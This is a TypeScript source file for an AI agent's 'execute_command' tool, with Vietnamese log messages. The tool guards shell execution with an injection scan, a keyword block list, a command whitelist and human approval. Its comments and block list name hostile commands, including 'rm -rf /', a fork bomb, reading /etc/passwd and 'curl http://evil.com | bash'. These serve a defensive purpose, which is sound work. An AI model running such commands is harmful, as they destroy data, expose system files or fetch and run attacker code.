import { spawn } from "node:child_process";
import { logger } from "@utils/logger";
import { HITLGuard } from "@security/HITLGuard";
import { z } from "zod";

const ArgsSchema = z.object({ command: z.string() });

export const metadata = {
  requires_hitl: true,
  name: "execute_command",
  search_keywords: ["execute_command", "execute command"],
  description:
    "[ASK_FIRST] Thực thi một lệnh trên Terminal/Command Prompt của hệ điều hành. Dùng để chạy script, kiểm tra mạng, hoặc khởi chạy các công cụ phân tích.",
  parameters: {
    type: "object",
    properties: {
      command: {
        type: "string",
        description: "CLI command to execute.",
      },
    },
    required: ["command"],
  },
};

/**
 * Security Error class for command injection attempts
 */
class CommandInjectionError extends Error {
  name = "CommandInjectionError";
  constructor(message: string) {
    super(message);
  }
}

/**
 * Shell metacharacters that enable command injection attacks.
 * These are blocked BEFORE whitelist check to ensure defense in depth.
 */
const DANGEROUS_SHELL_CHARS = /[;&|`$(){}\\><!]/;

/**
 * Detect command injection patterns that bypass simple regex whitelists.
 * Examples:
 *   - "ping 1.1.1.1 & rm -rf /"  (chain commands)
 *   - "echo test | grep foo"      (piping)
 *   - "ping; cat /etc/passwd"    (semicolon separator)
 *   - "ping`whoami`"              (backticks)
 *   - "ping$(whoami)"             (command substitution)
 */
function detectCommandInjection(command: string): CommandInjectionError | null {
  if (DANGEROUS_SHELL_CHARS.test(command)) {
    return new CommandInjectionError(
      `SECURITY: Command contains forbidden shell metacharacters: ${command.substring(0, 50)}...`
    );
  }

  const cmdLower = command.toLowerCase();

  // Block common injection vectors
  if (
    cmdLower.includes("rm -rf") ||
    cmdLower.includes("format ") ||
    cmdLower.includes(":(){ :|:& };:") ||
    cmdLower.includes("forkbomb") ||
    cmdLower.includes("del /f /s /q") ||
    cmdLower.includes("shutdown") ||
    cmdLower.includes("net user") ||
    cmdLower.includes("sudo ") ||
    cmdLower.includes("chmod 777")
  ) {
    return new CommandInjectionError(
      `SECURITY: Command contains known destructive pattern: ${command.substring(0, 50)}...`
    );
  }

  // Block URLs with command payloads (e.g., "curl http://evil.com | bash")
  if (/\|\s*(bash|sh|powershell|cmd)/i.test(command)) {
    return new CommandInjectionError(
      `SECURITY: Pipe to shell interpreter detected: ${command.substring(0, 50)}...`
    );
  }

  return null;
}

/**
 * Safe command prefix whitelist - only these commands are allowed.
 * Uses EXACT prefix matching (not regex) for stronger security.
 */
const SAFE_PREFIXES: ReadonlyArray<string> = [
  "ping ",
  "ping -",
  "dir ",
  "dir",
  "echo ",
  "echo",
  "python ",
  "python3 ",
  "node ",
  "npm ",
  "npx ",
  "git ",
  "tsc",
  "ls ",
  "ls",
  "cls",
  "clear",
  "cd ",
  "type ",
  "cat ",
  "head ",
  "tail ",
  "grep ",
  "find ",
  "where ",
  "curl -",
  "curl ",
  "wget ",
  "pip ",
  "pip3 ",
];

/**
 * Check if command starts with a safe prefix (case-insensitive for Windows).
 */
function isSafePrefix(command: string): boolean {
  const cmdLower = command.toLowerCase();
  return SAFE_PREFIXES.some((prefix) => {
    if (prefix.endsWith(" ")) {
      return cmdLower.startsWith(prefix.toLowerCase());
    }
    const nextChar = command[prefix.length];
    return cmdLower.startsWith(prefix.toLowerCase()) &&
      (nextChar === " " || nextChar === "\n" || nextChar === undefined || nextChar === "&" || nextChar === ";");
  });
}

/**
 * Execute a command using spawn (no shell by default) for better security.
 * Returns stdout as string.
 */
function executeSafeCommand(command: string): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  return new Promise((resolve, reject) => {
    // Parse command and arguments
    const parts = command.trim().split(/\s+/);
    const cmd = parts[0];
    const args = parts.slice(1);

    let stdout = "";
    let stderr = "";

    const child = spawn(cmd, args, {
      shell: false, // No shell = no command injection
      windowsHide: true,
    });

    child.stdout?.on("data", (data: Buffer) => {
      stdout += data.toString();
    });

    child.stderr?.on("data", (data: Buffer) => {
      stderr += data.toString();
    });

    child.on("error", (err) => {
      reject(new Error(`Spawn failed: ${err.message}`));
    });

    child.on("close", (code) => {
      resolve({
        stdout: stdout.substring(0, 10000), // Cap output at 10KB
        stderr: stderr.substring(0, 1000),
        exitCode: code ?? 0,
      });
    });
  });
}

export const execute = async (rawArgs: unknown): Promise<string> => {
  const args = ArgsSchema.parse(rawArgs);
  const rawCmd = args.command.trim();

  try {
    // ═══════════════════════════════════════════════════════════════
    // LAYER 0: COMMAND INJECTION PRE-SCAN
    // Block shell metacharacters BEFORE any other processing
    // ═══════════════════════════════════════════════════════════════
    const injectionError = detectCommandInjection(rawCmd);
    if (injectionError) {
      logger.error({ context: "ExecuteCommand" }, `🚫 ${injectionError.message}`);
      return `[SECURITY BLOCKED]: ${injectionError.message}`;
    }

    // ═══════════════════════════════════════════════════════════════
    // LAYER 1: WHITELIST PREFIX CHECK
    // ═══════════════════════════════════════════════════════════════
    if (!isSafePrefix(rawCmd)) {
      logger.warn(
        { context: "ExecuteCommand", command: rawCmd },
        `❌ [TỪ CHỐI]: Lệnh không nằm trong Danh sách Trắng (Whitelist) an toàn.`
      );
      return `[HỆ THỐNG BẢO MẬT TỪ CHỐI]: Lệnh "${rawCmd.substring(0, 100)}" chứa rủi ro can thiệp OS. LLM System đã từ chối quyền truy cập. Vui lòng dừng ý định chạy mã độc hại.`;
    }

    // ═══════════════════════════════════════════════════════════════
    // LAYER 2: HUMAN-IN-THE-LOOP (HITL) APPROVAL
    // ═══════════════════════════════════════════════════════════════
    logger.info(
      { context: "ExecuteCommand", command: rawCmd },
      `⚠️ [SECURITY ALERT] LIVA yêu cầu thực thi lệnh hệ thống. Đang chờ HITL approval...`
    );

    let approved = false;
    try {
      approved = await HITLGuard.requestApproval({
        toolName: "execute_command",
        args: { command: rawCmd },
        reason: `Thực thi lệnh: ${rawCmd.substring(0, 100)}`,
      });
    } catch (err) {
      const errMsg = err instanceof Error ? err.message : String(err);
      if (errMsg === "REJECTED_BY_TIMEOUT" || errMsg === "REJECTED_BY_USER") {
        logger.info({ context: "ExecuteCommand" }, `⛔ Lệnh đã bị Hủy bởi User/Timeout.`);
        return `[HỆ THỐNG BẢO MẬT TỪ CHỐI]: Người dùng từ chối hoặc HITL timeout (300s). Hành động bị chặn.`;
      }
      throw err;
    }

    if (!approved) {
      logger.info({ context: "ExecuteCommand" }, `⛔ Lệnh đã bị Hủy bởi Admin.`);
      return `[HỆ THỐNG BẢO MẬT TỪ CHỐI]: Người dùng từ chối lệnh này.`;
    }

    // ═══════════════════════════════════════════════════════════════
    // LAYER 3: SAFE COMMAND EXECUTION
    // ═══════════════════════════════════════════════════════════════
    logger.info(
      { context: "ExecuteCommand" },
      `✅ HITL Approved. Đang thực thi: ${rawCmd}`
    );

    const result = await executeSafeCommand(rawCmd);

    if (result.stderr && result.stderr.trim() !== "") {
      logger.warn(
        { context: "ExecuteCommand", stderr: result.stderr },
        `[Cảnh báo] Stderr: ${result.stderr}`
      );
    }

    if (result.exitCode !== 0) {
      return `Thực thi hoàn tất với exit code ${result.exitCode}:\n${result.stdout || "(no output)"}\n${result.stderr ? `\nStderr: ${result.stderr}` : ""}`;
    }

    return `Kết quả thực thi:\n${result.stdout || "(no output)"}`;
  } catch (error: unknown) {
    const errMsg = error instanceof Error ? error.message : String(error);
    logger.error({ context: "ExecuteCommand", error: errMsg }, `❌ Thực thi thất bại`);
    return `Thực thi thất bại (Execution failed): ${errMsg}`;
  }
};
